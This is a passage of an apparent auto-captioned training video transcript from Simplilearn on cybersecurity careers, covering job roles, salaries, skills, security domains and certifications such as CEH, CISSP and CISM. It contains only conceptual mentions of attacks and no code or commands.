hi everyone welcome to day three of the
cyber security week by simply learn on
day two we looked at ethical hacking in
detail today we are going to focus on
the fundamentals of cybersecurity
cybersecurity is a fascinating branch of
information technology this field is
highly lucrative cyber security involves
makes various networks data and computer
systems from unauthorized digital access
there are several ways to implement
cyber security depending on the kind of
network you are connected to and the
type of cyber attacks you are prone to
so today that is on day three we learn
the different types of cyber attacks the
importance of cyber security and what
cyber security is all about following
this you will be briefed about the
various cyber security certifications
available today and the career prospect
in this field we will also look at the
world-renowned cicsp certification so
let's continue our cyber security
journey on day three with the world
turning virtual cyber attacks are
constantly flooding new headlines kovit
19 accelerated the current digital
transformation and the year 2020
witnessed several data breaches
since technology has become more
intertwined with our daily lives it is
no surprise that the need for skilled
cyber security professionals is
increasing
on that note hey everyone welcome yet to
another exciting video by simply learn
which will take you through the top
cyber security career options available
today there is a significant lack of
skilled cyber security professionals who
can tackle the cyber security challenges
faced daily hence a career in cyber
security is demanding an equally
rewarding
finding the right career path in the
cyber security industry isn't always
easy here we are here to help you with
that
there are a few prerequisites for a
career in cyber security the basic one
being a bachelor's degree in a subject
relating to cyber security
however if you don't have a relevant
degree you can always take up relevant
cyber security certifications and
kick-start your cyber security journey
a few other skills like networking
knowledge of operating systems and cloud
security are required to start and grow
your cyber security career you can check
out our video on the top five cyber
security skills to know more
cyber security jobs vary from entry
level to executive management and
everything in between there are several
cyber security paths available today it
is best if you start with entry level
and then move on to the next level with
the help of certifications and relevant
experience
here let us have a look at the top 5
cyber security job roles today
the first job role is that of a network
engineer
network engineers construct and
administer a company's computer networks
they are responsible for installing
configuring and supporting network
equipment they also configure and
maintain firewalls switches and routers
this entry-level cyber security job can
help you start your journey to become an
ethical hacker
the annual average salary of a network
engineer in the us is eighty five
thousand and ninety eight dollars and in
india it is around five hundred ten
thousand rupees
second on our list is information
security analyst as an information
security analyst your primary duty is to
protect sensitive information
information security analysts create and
implement plans for preventing cyber
attacks they monitor data access and
ensure compliance with policies
depending on the cyber threat they
decide if it has to be resolved or
escalated further in the u.s an
information security analyst earns 89
and 140 dollars annually and in india
they earn 6 lakh 42 and 756 rupees third
on our list is ethical hacker they are
also known as penetration testers they
are network security consultants who
identify and exploit system
vulnerabilities just like how a hacker
would do
they probe and test the network using
various penetration tools and software
they also design new penetration tools
and document the test results in the us
a certified ethical hacker earns around
93 000 on an annual average basis and in
india they make around 5 lakh rupees
the fourth job role that we are going to
talk about is security architect
security architects research and plan
the security elements for their
organizations they design robust
security structures that are capable of
preventing malware attacks
a security architect approves the
installation of routers vpn and
firewalls their duties go beyond just
architecture building and including
formulating company procedures
guidelines and user guides
security architects in the us make a
handsome sum of 124 000 a year on an
average and in india they make nearly 21
lakh 80 000 rupees
and finally fifth on our list is chief
information security officer ciso they
are senior level officers in an
organization they ensure the safety of
the information they develop implement
and maintain information security and
risk management programs they also
interact with stakeholders and regularly
brief them with information security
concerns the average annual salary of a
chief information security officer in
the states is a whopping 165 000 dollars
annually and in india it is 22 lakh 22
and 845 rupees
several companies are looking for
skilled cyber security professionals
phillips siemens google microsoft and ge
to name a few with passion the right
amount of experience and relevant
certifications you can grow your cyber
security career you can check out simply
learn cyber security expert master's
program to equip you with the necessary
skills needed to become an expert in
this rapidly growing domain
this course will help you learn various
methods as to how you can protect your
infrastructure secure your data run risk
analysis achieve compliance and much
more in today's world data is generated
in exchange at a high speed did you know
that 2.5 quintillion bytes of data are
generated every day companies all over
the world make crucial decisions by
analyzing all of this data with the rise
of data there has been a tremendous
increase in the number of cyber crimes
across the globe to prevent cyber
attacks cyber security is implemented so
what is cyber security it is nothing but
the practice of protecting networks
programs computer systems and their
components from unauthorized digital
access as mentioned earlier companies
rely on data and it is required that the
data is not compromised or stolen to do
this job we have various cyber security
professionals who are skilled to protect
data from cyber attacks there has been a
sky high growth in the number of cyber
security jobs this growth will only
double in the near future as companies
will always be on the lookout for
skilled professionals who can protect
the confidentiality of the data so now
that we know why cyber security jobs are
important let us have a look at the
various cyber security job rules there
are various kinds of cyber security job
roles let's go through few of the top
paying job roles going in the descending
order of the salary structures in the
usa we first have the chief information
security officer job role followed by
the security architect penetration
tester
then we have cyber security engineer
malware analyst and finally we will look
into the computer forensic analyst job
role i will now preview about each of
these job roles individually and look
into their responsibilities skills and
salary structures both in the usa and in
india so let's start off with chief
information security officer a ciso is a
senior level officer in any organization
he is entrusted with the safety of the
data in an organization a ciso has
various responsibilities they are
required to develop implement and
maintain an organization's security and
risk management program they also
communicate with their organization
stakeholders and brief them about
various information related security
concerns by doing so they are able to
implement a better security system for
an organization at times a ciso would
have to also recruit an id team's
members they need to make sure that the
candidate is knowledgeable and skilled a
company's risk and vulnerabilities have
to be predicted beforehand prediction of
such risks and vulnerabilities are taken
care of by a ciso they play a major role
in preventing cyber attacks in any
organization let's now look at the
different skills required to be a chief
information security officer first and
foremost a candidate must have good
communication and presentation skills
this is very important for any
organization a degree in computer
science along with an mba is a preferred
qualification mba is not mandatory but
there is an added advantage if the
candidate has an mba along with a
computer science degree the candidate
must be good at handling security
breaches it is preferred that the
candidate has prior experience of
handling a security breach and who is
also good with incident management many
employers prefer candidates who have
global certifications to become a chief
information security officer the
preferred certifications are cism that
is certified information security
manager and certified information system
security professional cissp if a
candidate has either of these
certifications they have a better chance
of getting a job as a chief information
security officer let's now move on to
their salary structures a ciso earns
nearly 180 000 dollars in the usa in
india the salary is nearly 25 lakhs per
annum that's a lot of money so these
were the responsibilities skills and the
salary structure of a chief information
security officer let's move on to our
next role our next role is that of a
security architect a security architect
maintains the security of an
organization's computer systems they
prevent the computer systems from
malware attacks let's look into their
responsibilities first and foremost our
security architect identifies weak spots
in a system by performing vulnerability
tests these tests are carried out on a
regular basis along with vulnerability
tests risk analysis and security
assessments are also done by a security
architect installation of routers vpn
and firewalls are approved by a security
architect these devices are very
important when it comes to the security
of an information system well a security
architect rightly approves the
installation of these devices digital
signatures and public key
infrastructures are designed in addition
to all the ebar responsibilities a
security architect also provides
technical assistance and guidance to the
other security team members let's now
move on to the skills required to be a
security architect first and foremost
the candidate must have a computer
science or an information technology
degree coming to the experience the
candidate must have an experience in the
field of risk management as the role of
a security architect is a lot to do with
managing risks understanding of the
network basics and various security
protocols along with cryptography is
required to be a good security architect
lastly the preferred certification to
become a security architect is that of a
cissp which is certified information
system security professional as
mentioned earlier this is only a
preferred certification a candidate who
has this certification has a higher
chance of bagging a security architect
job let's now look into the different
salary structures in the usa and in
india in the usa a security architect
earns nearly 123 thousand dollars per
annum in india a security architect
earns nearly 20 lakhs per annum so
that's all about security architect
let's now move on to our next role that
is penetration tester a penetration
tester also known as an ethical hacker
is a cyber security professional who
tries to exploit a security system's
vulnerabilities just like how a hacker
would do a penetration tester mimics the
role of a hacker let's look into the
various responsibilities of a
penetration tester as the name suggests
a penetration tester needs to perform
penetration tests to discover and
identify vulnerabilities in a system in
addition to this they are also
responsible for designing new
penetration tools all the penetration
tests results are documented and based
on the document new security measures
are discussed with the other it team and
the management a penetration tester
performs tests by developing codes and
they also conduct security audits which
help them understand the vulnerabilities
in a system let's now look into the
different skills required to be a
penetration tester a candidate must have
one to four years of experience in the
information security field knowledge of
windows linux unix operating systems is
required also the candidate must know c
and c plus plus languages such as java
php and pearl are preferred by employers
but not a requirement to successfully
back the position of a penetration
tester the preferred certifications are
certified ethical hacker that is ch and
certified expert penetration tester that
is cept let's look into the salary
structures of a penetration tester in
the usa a penetration tester earns
nearly 117 thousand dollars per annum
and in india a penetration tester makes
nearly four lakh rupees per annum
so those were the responsibilities
skills and salary structures of a
penetration tester
let's now move on to our next job role
that is
cyber security engineer on the whole a
cyber security engineer protects an
organization's network and its data they
also plan security measures to prevent
an organization from cyberattack let's
look into the responsibilities of a
cyber security engineer they design
cybersecurity platforms for a company
they are also responsible for planning
and implementing cyber security measures
well a cyber security engineer solely
designs plans maintains and implements
security measures in an organization
they are also required to report and
communicate with the other teams in an
organization a cyber security engineer
is different from a network security
engineer while a network security
engineer looks into the troubleshooting
a cyber security engineer looks into the
prevention of cyber attacks let's look
into the skills required to become a
cyber security engineer just like the
other job profiles a degree in computer
science or information technology is a
must well two years of experience in the
relevant field is required to become a
cyber security engineer a cyber security
engineer is needed to design security
systems hence a candidate with a good
problem-solving skill is required along
with good problem-solving skills the
candidate must also be good with
networking skills as mentioned earlier
knowledge of cnc plus plus is a must
java and python knowledge is preferred
to be a cyber security engineer moving
on to the salary a cyber security
engineer earns nearly 96 000
in the usa whereas in india a cyber
security engineer earns nearly 7 lakh
rupees per annum moving on to our next
job role that is malware analyst as the
name suggests a malware analyst is one
who identifies
various cyber threats such as worms
viruses trojans boats to understand
their nature a malware analyst is
skilled at analyzing the different
malware threats in a system let's now
look into a malware analyst's
responsibilities they're responsible to
identify threats and once they identify
they are supposed to document the
methods to avoid such malware threats
they also research and develop malware
protection tools
various malware protection tools are
developed by malware analysts so that
the next time a cyber threat occurs they
are able to easily identify
in addition to the above
responsibilities a malware analyst is
also responsible to constantly be
updated with the new malware threats
moving to the skills required a
candidate must know windows linux unix
operating systems and knowledge of c and
c plus plus is a must usage of tools
like idea pro early ddg reg short and
tcp view is suggested having a giac
reverse engineering malware
certification is a plus point the
certification is only a preferred
certification it is not a must that the
candidate must process this
certification moving on to the salary
structure a malware analyst earns nearly
eighty thousand dollars in the usa and
earns nearly rupees six lakhs per annum
in india so those were the skills
responsibilities and salary structure of
a malware analyst let's move on to our
last job role that is computer forensic
analyst previously we have seen the job
roles wherein they try to protect a
company from a cyber attack in this role
we will see how a computer forensic
analyst works after a cyber attack a
computer forensic analyst works on cases
following an attack they collect digital
evidences to retrieve information let's
look into their responsibilities with
the help of various investigation tools
a computer forensic analyst gathers
evidences from a system which was a
victim of a cyber attack their main
responsibility lies in recovering
deleted manipulated or stolen data a
computer forensic analyst helps various
officials in investigating a case by
discovering evidences from data which
was manipulated or compromised there
have been a lot of cases where a
computer forensic analyst has come to
the rescue of the police department
moving on to the skills the candidate
must hold a bachelor's degree and work
experience in the related field is
required for the post of a computer
forensic analyst it is not necessary
that the candidate must hold a computer
science degree but the candidate must
have relevant work experience a
candidate must have knowledge of
networking law and criminal
investigation as they have to do a lot
with investigating cases as well a sound
analytical mind is critical as they have
to analyze data and arrive at
conclusions as to identify the cyber
criminals the preferred certifications
to become a computer forensic analyst
are certified forensic computer examiner
that is cfce and certified computer
examiner that is cce well these were the
skill sets required to become a computer
forensic analyst moving on to the salary
structures a computer forensic analyst
earns nearly 71 000 in the usc and in
india a computer forensic analyst earns
nearly 8 lakh rupees per annum that was
all about computer forensic analyst well
those were the six top eight jobs in the
field of cyber security now i will run
you through a sample resume of a cyber
security engineer this is only a sample
resume of a cyber security engineer you
can alter it according to your own
preference here we first start off with
the name and your email id and phone
number then a quick summary about
yourself and what you're good at and
what you are looking for in an
organization after which you can give
your linkedin profile link and your
github profile link if you have one
moving on to the experience here you
would have to give the company's name
and the tenure ideally for a cyber
security engineer the minimum number of
years required is two and below that you
can write the different responsibilities
that were taken care by you in your
previous organization tcp network
administration and security monitoring
are two important responsibilities that
any cyber security engineer must have on
their resume it is great if you have
configured firewalls and ids as well
underneath that you can mention the
education and it is required that you
have a degree in computer science or in
information technology you can then
mention your university and your gpa
moving on to the skills we have
technical skills and non-technical
skills here under technical skills you
would have to write the languages that
are known to you for example c c plus
plus which is a must java and python are
preferred too knowledge of windows linux
and unix operating systems will also
have to be on your resume if you're
applying for a post of a cyber security
engineer the other skills depend from
person to person here i have ideas and
ips penetration vulnerability testing
encryption technologies knowledge of sql
and at the end you can also write the
certifications ideally a cyber security
engineer must have ccna ccnp
certifications in addition to it even a
com ti plus certification is preferred
moving on to the non-technical skills
here you can mention the languages that
you're good at the different
competitions that you have participated
in it can also have your co-curricular
activities and anything to do with
problem solving would also be an added
advantage with businesses moving online
and shifting to cloud storage currently
the demand for cyber security is at its
peak
with that comes a high demand for cyber
security experts who can safeguard
digital data
according to cyber crime magazine by
cyber security ventures globally there
would be nearly 3.5 million unfilled
cyber security jobs by 2021 and the
number of internet users will hit a
whopping 6 billion by 2022
these numbers speak volumes and this
shows the growing demand for cyber
security professionals across the globe
now that you know the high demand for
cyber security professionals let us help
you start your cyber security career by
bagging the right skill set
many of you out there might be waiting
to become a cyber security professional
but are unsure of how to go about it and
what skills you would need to get a
cyber security job
not to worry we are here to help you
with that after extensive research we
have come up with the top five skills
that will help you get into the field of
cyber security let's have a look at
these skills individually
first we have networking and system
administration
the number one skill you need to have to
enter the field of cyber security is
computer networking
networking is the backbone of the
internet it is imperative that you have
an in-depth understanding of networking
to start a career in cyber security
a network is a group of interconnected
devices and networking is the art of
understanding how data is sent
transmitted and received amongst these
devices
you need to know various routing
protocols the tcp and osi models govern
networking the osi model is
comparatively newer
basically in these models all the
protocols are grouped into layers and
work together to help you receive data
on your device sent from a server
learning networking will help you
understand the technical aspects of data
transmission which will help you secure
your data
you can take up networking
certifications like security plus and
cisco ccna to gain a strong networking
foundation
another skill that will be beneficial
for you is to master system
administration
if you think about it all of us are
sysadmins at some level
system administration is all about
configuring and maintaining computers
you must be curious to know every aspect
of your computer features and settings
and play around a bit
carry out a trial and error method and
give yourself small tasks like
recovering deleted files or monitoring
old viruses on a vm
explore new techniques put them into use
and expand your knowledge
let us now move on to our second skill
knowledge of operating systems and
virtual machines
to become a cyber security professional
you need to have a strong knowledge of
operating environments such as windows
linux and mac os
cyber security professionals largely use
linux and it comes with several tools
to learn operating systems go ahead and
set up and use virtual machines that is
vms and play around with them this will
help you gain hands-on experience
as a cyber security expert you should be
comfortable working on any os
vms allow you to train and research in
an isolated environment and help you
maximize your skills
the next point to remember is to know
kali linux
it is the most widely known linux
distribution for ethical hacking and
penetration testing
it comes with several hundred tools
related to penetration testing malware
analysis security research computer
forensics and so on
kali contains several projects and you
can learn a lot another good thing about
kali is that it is free to use so what
are you waiting for
download and start right away
remember that linux is the backbone of
cyber security and a commonly asked
topic for cyber security interviews
especially for pen testing roles
moving on to our third skill
our third skill is network security
control
it is another basic skill that every
cyber security professional should have
network security control refers to the
different measures which are employed to
enhance the security of a network
it is simple you can only safeguard your
network if you know how it works how
routers firewalls and other devices work
a firewall is a hardware or software
that blocks incoming or outgoing traffic
from the internet to your computer
firewalls are required to secure a
network as a cyber security expert you
must be able to leverage a firewall to
filter and prevent unauthorized traffic
onto the network
in addition to that as a cyber security
expert you must know about intrusion
detection systems intrusion prevention
systems virtual private networks and
remote access
an intrusion detection system ids is
designed to detect unauthorized access
to a system
it is used together with a firewall and
a router
you should be able to operate the ids
and recognize any security policy
violations and malicious traffic on the
network
as many of you may have used a vpn is a
connection between a vpn server and a
vpn client it is a secure tunnel across
the internet
moving on next up we have an interesting
skill any idea what that is if yes pause
and leave a comment as to what you think
the next skill will be
if getting your learning started is half
the battle what if you could do that for
free
visit skill up by simply learn click on
the link in the description to know more
and before we jump into this skill if
you find this video interesting make
sure to give it a thumbs up
fourth skill on our list is coding
so you might be wondering if coding is
really required to become a cyber
security professional well it is true
that not all cyber security
professionals have or need coding skills
however having zero coding knowledge may
limit your opportunities in the future
knowing a couple of programming
languages will help you identify the
plan behind deadly hacking techniques
so as seen on your screens these are the
best programming languages to learn to
make your cybersecurity career
worthwhile
we have c and c plus plus the c
programming language is the backbone of
most operating systems c and c plus plus
are low level programming languages that
you need to know as a cyber security
professional
on the other hand python is a high level
programming language that is becoming
popular among cyber security experts
today knowing python will give you an
upper hand in your career it will help
you identify and fix vulnerabilities
javascript is another high level
programming language that adds
interactivity to web pages
a good advantage of knowing javascript
is that you can prevent cross-site
scripting attacks from occurring
as in these attacks the attacker
implants malicious code in a web
application speaking of php because most
of the websites are created using php
learning it will help you defend against
intruders
similarly html is another language cyber
security professionals should understand
as most websites use it and it is one of
the easiest languages to learn
another programming language that you
can use is golang it is great for
cryptography you can solve various cyber
security problems with it
then we have sql that is structured
query language attackers use this
language to damage the stored data one
such example is the sql injection attack
hence having a good understanding of sql
will be highly beneficial
another point we'd like to highlight is
to have knowledge of assembly language
this will help you become a cyber
security engineer assembly will help you
understand how malware functions and
thereby help you defend against it in
the cyber security domain you can't just
lock into a single language and hence it
is advised that you are acquainted with
a couple of them
you can also do a crash course for these
languages and learn them
hence determine the best programming
language for your cyber security role
and get familiar with the basics
moving on our fifth skill on the list is
cloud security
there is a growing demand for cyber
security professionals with cloud
security skills in the coming years
companies are on the lookout for
professionals with security skills
applicable to public and hybrid cloud
platforms such as amazon web services
and azure
more organizations look to cloud
infrastructure to store data and run
applications
this includes the implementation of
policies and technologies that protect
cloud-based systems and devices
just like application development
security cloud security also involves
building secure systems from the start
companies want professionals who can
manage the cloud security tools to
identify and prevent any cloud breaches
people with experience and knowledge in
managing big platforms such as microsoft
azure aws and the gcp are in high demand
now that we have seen the top 5 cyber
security skills let us go through a set
of additional skills that can help you
get into the cyber security field
remember that to become a successful
cyber security expert you must possess a
rich and diverse skill set
so in a list of additional skills first
we have risk analysis
identifying risks even before their
arrival is a great skill cybersecurity
professionals are required to identify
manage and mitigate risks
risk management and mitigation is a
skill set that is going to be highly in
demand in the coming years
next we have information security
companies require skilled professionals
who can protect their electronic data
from unauthorized access
here in demand skills are authentication
authorization malware analysis and data
recovery
next on our list is security incident
handling and response
as a cyber security expert you must be
prepared to handle any forthcoming
threat of violating an organization
security policy
by following an updated incident
response plan your team can proactively
protect your data and minimize the
damages
in security incident management you are
required to identify manage record and
analyze security threats in real time
a security incident can be an active
threat or a successful compromise of
data or an attempted intrusion
it can also be incidents like ddos
attacks phishing apts ransomware and
many more
another important pointer is that as a
security practitioner you must also
manage and analyze the security
information and event management siem
tools and services
moving on we have security audit
security auditing is an internal check
that is carried out to find flaws in the
organization's information system you
must be able to conduct a review of the
organization's adherence to regulatory
guidelines
security audit and compliance knowledge
are very crucial as any mistake of
regulatory compliance could lead to
hefty penalties
soon organizations will need people who
are more familiar with the various data
privacy regulations if you are good at
paperwork you can capitalize on this
skill companies will need people who can
understand what paperwork to file and
which security protocols to use to
comply with the regulations
finally we have loss and regulations and
often overlooked cyber security aspect
there are several cyber security laws
and regulations and if you break these
laws intentionally or not it doesn't
matter as you will still be charged
these laws define how you can use the
internet and it also defines how people
can be protected from becoming the
victims of cyber crimes
knowing these laws and regulations and
following the best practice will make
you ethical at your job and this will in
turn be good for your organization so
those were our list of additional skills
apart from these make sure you stay
updated with new hacks and learn new
tools as cyber security is ever evolving
another important skill apart from these
technical skills is your soft skills
having a set of good soft skills will
help you bag your dream job
we have a video on the top five soft
skills that will help you grow in your
career do watch that and incorporate
those skills as well let's start off
with the educational qualifications
first so as far as educational
qualification is concerned having a
graduate degree in computer science or
i.t security or related field is a given
having a master's program or a master's
degree is an added advantage there are a
lot of universities out there in today's
world that offer both bachelor's and
master's degrees in cyber security or
various computer fields you might want
to look them up before you decide which
university you want to you want to go
with there are private institutes like
ec council sans or comchair that offer
these kind of programs as well the costs
vary some of them are correspondents
some of them are physical in nature so
let's talk about the skills that you
require to become a cyber security
expert or an engineer these are your
baseline skills it will be very
important that you have some of the
knowledge out of all of these tasks it
may not be necessary that you have
everything at uh at the start itself but
it will help you if you start building
on these technologies before you start
looking at advanced certifications so
you need to have solid ground in id
fundamentals uh which means that you
need to understand computers you need to
understand how they function the
components of a computer uh maybe what's
a processor what is a cachet basically
understanding the hardware part of it
right then solid ground in networking
fundamentals uh you uh hackers normally
target the network you want to hack over
the internet you want to hack over the
intranet there are a lot of protocols
that are required and are utilized for
data to be transmitted from one point to
another there are a lot of routing
protocols of how a data packet can be
converted from a internal ip address to
an external ip address how that packet
is going to take a part to the end point
and how is it going to travel back to
your machine and how your machine and
the endpoint machine are going to
interact with each other so having a
good understanding of networking and how
computers function over the intranet and
the internet is a very much required
knowledge base coding skills now as far
as coding is concerned we are not going
to develop applications over here but
some scripting skills would be necessary
especially if you're going into network
security and host-based security uh for
example you want to write your write
your own exploit in various tools like
metasploit so you might want to learn
languages like ruby however if you're
going to go into application security
then knowing java knowing c plus plus
those kind of languages is a must you
may not be able to write complex
programs but you need to understand how
those functions are being called you
need to know standard secure coding
practices that that need to be utilized
for an application to be secure then
understanding the architecture of an
operating system it is imperative that
we know how operating systems function
and not function from a usability
perspective but from a troubleshooting
perspective we need to understand uh if
there is an error on the operating
system how do we troubleshoot that we
need to understand how processes work in
the background how memory mapping works
in the background uh what web
application pools are being utilized and
the various protocols that are being
consumed by the operating system now
cloud security is a very niche skill in
today's world but cloud as we all know
is here to stay and most of the
organizations that you'll deal with will
either have a private cloud a public
cloud or a hybrid cloud so it is
imperative that you upskill yourself
understanding how cloud technologies
work how they can be integrated in your
day-to-day infrastructure and how you
can secure a cloud now this doesn't
become a baseline requirement obviously
you'll need to grow and you'll need to
build based on the expertise that you
have but over a period of time it would
benefit you to have cloud security uh
knowledge and then malware analysis and
reversing when we're talking about cyber
security one of the most common attacks
that we'll see would be from a virus or
a trojan so understanding how these
softwares work how to identify them how
to troubleshoot them how to reverse
engineer them and analyze these malwares
becomes important again this may not be
a baseline requirement but you need to
hone on your skills on understanding
malwares and reverse engineering them
especially if you're going into a
malware analysis kind of a role let's
start with the domains in cyber security
let's understand what kind of domains
are available and how we can map them as
we go ahead with certifications and our
job rules so starting with the domains
in cyber security there is access
control systems and methodologies
telecommunications and network security
security management and practices access
controls uh control systems and
methodologies would talk about identity
and access management single sign-ons
federation so basically designing access
controls identifying uh the people who
are trying to log in authenticating them
and then authorizing them to access some
resources that are there in your
organization so we're basically talking
about the ia standards over here
identification authorization
authentication and accountability then
there's telecommunications and network
security so you start up here with
certifications like ccna ccnp where
you're talking about communications and
protocols that work on the intranet and
the internet so how to secure these
protocols how to deploy these protocols
to start off with how to configure
switches routers and how to secure them
so that data leakages or attacks on your
networks can be minimized then we have
security management practices which
basically deal with disaster recovery
and business continuity planning so here
you're planning about system failures
because of various attacks like a
distributed denial of service or a virus
or a ransomware attack or even
environmental attacks like natural
disasters like fires or flooding and
manmade disasters where people cannot
show up to work and you have to ensure
that your business continuity is not
affected because any of these factors
security architectures and models so
this domain focuses mostly on having
security policies and procedures so here
you are more on a managerial perspective
where you're creating policies to be
implemented in your organizations
policies are nothing but high level
standards which you need to implement
for example what level of encryption you
want do you want to use a policy would
include things like data classification
so you're identifying data and you're
classifying them based on the
sensitivity of that data towards your
organization for example some of that
data could be classified some of them
could be secret top secret and some data
could be unclassified so these policies
help you identify and decide how you're
going to treat security in your
organization then we have law
investigation and ethics so this domain
can be mapped with the forensic
investigations so for example a crime
has happened somebody has got
compromised some data has been
compromised you as a foreign
investigator
come in and try to analyze what went
wrong you try to analyze what has been
affected to what extent has been
affected how did the attack happen then
application and system development
security now this is where you're
talking about application security so
let's say you go into a software
development lifecycle you're developing
an application and you want to treat
that application with security in mind
so your ova's top 10 open web
application security project comes in
you look at the top 10 risks like
injection attacks uh maybe cross-site
scripting cross-site request forgery and
you try to mitigate these attacks by
following secure coding practices
testing the application from a security
perspective and ensuring that your
coding is strong enough to withstand
such attacks cryptography so this is
where you go into the encryption phase
where you are going to try to create
solutions on how which kind of
encryptions you want to utilize to
protect which kind of data if you
remember earlier on we talked about
policies where we did data
classification where some data is
sensitive some data is classified top
secret and uh those different various
classifications now uh to keep costs at
bay you cannot use the same encryption
across because what you're using for
confidential information or secret
information would be a very high level
encryption which would cost you a lot of
money to implement so in cryptography
it's basically you becoming an expert in
understanding which kind of encryption
standards you want to implement on what
kind of data or what kind of solutions
you want to integrate on an
organizational level so here you'll be
looking at data in use when data is
being consumed by a user data in motion
when it's been transmitted for example
the https connection that we have with
websites or data in rest when data is
being stored onto a stationary hard disk
and you want to encrypt that then you
have the computer operation security so
this would be covering your day-to-day
security operations so something that we
call a stock a security operations
center where you're going to look at all
the various incidents that happen on a
regular basis you're going to
investigate those incidents and you're
going to see if they're going to affect
your organization's security in any
which map in any which manner and then
trying to come up with a solution to
prevent that from happening and the
final part is physical security now this
does look like it it may not cover i.t
security but it does for example your
doors that you're going to place to
sensitive areas for example a server
group you do not want anyone and
everyone access to that server room so
what kind of security are you going to
use to secure that server room for
example cctv cameras or biometrics on
your doors so what kind of doors do you
want there in the first place do you
want to keep security guards over there
and they're going to frisk people to see
if they're carrying anything that can be
used to manipulate the security of the
servers moving on from the domains let's
start with the foundational cyber
security courses now the first four that
are populating the screen ceh security
plus certified network defender and the
forensic investigator now they are
mapped as foundational cyber security
courses but in their own right they are
still advanced courses because if you
see they do assume that have some
knowledge on scripting you may have some
basic knowledge on operating systems but
you are technically adept at analyzing
problems so they do assume a little bit
of knowledge from your side if you're a
fresher you want to hone up a little bit
on your networking skills you want to
hone up a little bit on how operating
systems work and how their processes
work and then you want to attempt these
certifications the first one being sir
certified network defender now this is a
certificate that talks about network
security ceh on the other hand talks
about an ethical hacker from an
offensive security perspective where
you're doing a penetration test and
you're going to try to leverage attacks
against an organization to analyze how
their security is compcia security plus
also is on the same lines of ceh uh ceh
is offered by an organization called ec
council the competitor to them is
comptia both of them are globally
accepted certifications widely accepted
across the americas europe and asia the
chfi which is the computer hacking
forensic investigator certification is
basically the niche certification for
forensic investigators you can directly
attempt the chfi but if you don't know
how hackers work uh it may defeat some
of the purpose so uh it would help to
first go for the ceh or the security
plus and then the following investigator
certification let's look at a brief uh
overview on each of these to start off
with the ceh it is going to train you in
reverse engineering so this is where
penetration testers come in and the word
ethical hackers hackers are basically
people who try to get unauthorized
access to various resources ethical
hacker is where you're going to emulate
or simulate those attacks with an
authorization from the organization so
you still keep it legal the aim is to
find out various flaws in the current
deployment of security controls and then
try to figure out how you can plug those
flaws and increase or improve on the
security posture so it's ceh and comp
comchair security plus are about the
same it's just the difference of the
certification body but both of these are
widely accepted and globally accepted as
well then we have the certified network
defender covers
protection identification and response
to on how we approach network security
so this is the certification that is
going to explain you certain protocols
we're going to talk about switches
routers various technologies of lan van
man and we're going to talk about how we
can secure networks uh on an
organizational perspective the forensic
investigator certification as we've
discussed is in the domain of law
investigation and ethics it talks more
about analyzing how the attack happened
what was affected what was compromised
to what extent and then we are trying to
reverse engineer and try to identify the
culprit of who attacked that
organization after the foundational
we're going to look at the managerial
cybersecurity courses now here you are
either a cyber security manager or
you're looking at a lead kind of a
scenario where you are responsible to
manage the team who's going to implement
security in your organization the
difference here is the previous courses
are very technical in nature very
hands-on in nature and you are the
person who's going to be responsible to
implement that security control or test
that security control here in managerial
cyber security courses you're not going
to be technical hands-on but you're
going to be more on the policy side of
things so start off with cobit cobit
stock talks about control objectives for
information and related technologies now
this is an advanced kind of a
certification then we have cism some
people call it system as well it's a
certified information security manager
certification then we have sisa or cisa
certified information systems auditor
and then we have the crisc which is a
certified in risk and information
systems control so as you can see just
from the names nothing hands-on no
penetration testing no vulnerability
assessments no implementation of tools
but you're going to have a holistic view
of how vulnerabilities and threats are
going to affect the organization and you
will be responsible to manage and guide
the team on what to be implemented and
what to be consumed so you will be
managing teams technical teams on how to
implement security and how to analyze
that security uh you'll try to make
sense of data that has been provided to
you and utilize that data to make
business sense so what is cobit it gives
you a deep understanding of the
framework for managing and governing
enterprise id environments so it's all
about the environment now you're in an
enterprise organization this is a
standard so it gives you a basic
framework of how you want to implement
security from an end-to-end perspective
you're going to talk about id governance
here you're going to deal with a lot of
stakeholders over here you're going to
get a lot of various inputs and you're
going to analyze that information and
you're going to implement the framework
based on the analysis that you have done
people with cobit certifications and
who've been hired as managers would
normally have around eight nine years of
experience and only then would they be
put in such a position cism does
security manager certification it is a
key certification for information
security professionals who manage design
oversee and assess enterprise
information security so this is more
from a project management perspective
but projects regarding security so it is
a semi technical certification it is
necessary that you understand the
technical terms of hacking or ethical
hacking you have a basic understanding
of what kind of risks or attacks are
present in a cyber security enterprise
and then you're going to manage the
project and try to implement security
and analyze that security to see
everything needs standards so as far as
the security manager is concerned since
we're talking about the manager
portfolio you obviously will have to
have some experience before you
get these kind of job roles then comes
the cisa or the cisa the systems auditor
it will give you the skill sets to
govern and control enterprise id and
perform an effective security audit on
any organization so this is more of a
system auditor's profile where you're
going to talk about overall functioning
of a it infrastructure in an
organization you're going to audit that
infrastructure to ensure that it meets
standards and you're going to look at
the risks that that are going to affect
this infrastructure you're going to do a
risk management exercise and then you're
going to come up with security controls
on how to minimize or mitigate these
risks the crisc the risk there's another
risk management certification but it is
widely accepted and it has a lot of
value globally this course will enable
you to design implement monitor and
maintain information security controls
for enterprises now this certification
only deals with risk management so it
has a complete strategy that evolves and
revolves around risk identification
assessment response and control
monitoring so the major job position
that you're going to have is in an i.t
infrastructure identifying the risks or
identifying the identifying the security
risks that the organization is going to
face you're going to assess them so a
business impact analysis if that risk
comes true how is it going to affect the
business not only from a technical
perspective but from a monetary
perspective as well and then you're
going to do a cost benefit analysis for
a security control for example i figure
out that a web application has a sequel
injection attack vulnerability if the
assessment proves that if this becomes
real or if this is realized by a hacker
we would be looking at a potential loss
of 1 million dollars and will have to
report it to the regulatory authority
which would then lead to further fines
so here then we're going to figure out a
response to this threat where let's say
we identify a web application firewall
and an implementation of that firewall
will minimize the risk at the same time
a developer would come into the picture
and say we can redevelop the application
or that part of the application where
the vulnerability exists and we can
ensure that the application is secure
now when you do a cost benefit analysis
you figure out that for the recoding of
that part of that application would take
at least six months and is going to look
cost us a lot of money whereas if we
implement a web application firewall it
will just cost us around fifty thousand
dollars and we would still minimize a
million dollar risk now here it is the
responsibility of the risk manager to
identify which solution would benefit
the organization in the long run so
that's where your cost benefit analysis
comes in and then you're going to
implement the solution and then you're
going to continuously monitor it to
ensure that the risk doesn't surface
again so it depends on which
organization you're talking about but
you i mean you would need at least three
to four years of experience in risk
strategy before you become a risk
manager but these are the certifications
that are going to identify and help you
in your career path as we go ahead now
before we go into cloud computing
courses just one point that i want to
highlight here the first courses that we
talked about were technical the second
we're managing in perspective now even
if it is it security that we talk about
